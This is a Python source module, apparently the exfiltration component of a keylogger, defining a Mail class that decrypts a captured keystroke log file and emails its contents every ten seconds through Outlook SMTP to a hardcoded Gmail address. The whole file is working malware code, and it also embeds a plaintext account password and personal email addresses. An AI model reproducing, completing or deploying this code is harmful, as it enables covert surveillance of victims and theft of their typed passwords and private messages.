import smtplib
import time

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Thread


from .crypt import Crypt
from .py_installer_config import resource_path


class Mail:
    INTERVAL = 10
    FROM = "keyloggingtest1234@outlook.com"
    TO = "ramezanpourmohammadjavad@gmail.com"
    SUBJECT = "THIS IS SECRET"
    PASSWORD = "zQ@o7L5J4@AwWN7AK#"

    def get_text(self):
        with open(resource_path("files/log.txt"), "rb") as enc_file:
            encrypted_log_byte = enc_file.read()

        decrypted_log_byte = Crypt().decrypt(encrypted_log_byte)

        return decrypted_log_byte.decode("utf-8")

    def get_message(self):
        text = self.get_text()

        if not text:
            raise ValueError()

        message = MIMEMultipart()
        message["from"] = Mail.FROM
        message["to"] = Mail.TO
        message["subject"] = Mail.SUBJECT
        message.attach(MIMEText(text))

        return message

    def send(self):
        try:
            message = self.get_message()
        except:
            return

        with smtplib.SMTP(host="smtp-mail.outlook.com", port=587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(Mail.FROM, Mail.PASSWORD)
            smtp.send_message(message)

    def start(self):
        while True:
            # you could import timer here, but this is what i like
            thread = Thread(target=self.send, daemon=True)
            thread.start()

            time.sleep(Mail.INTERVAL)
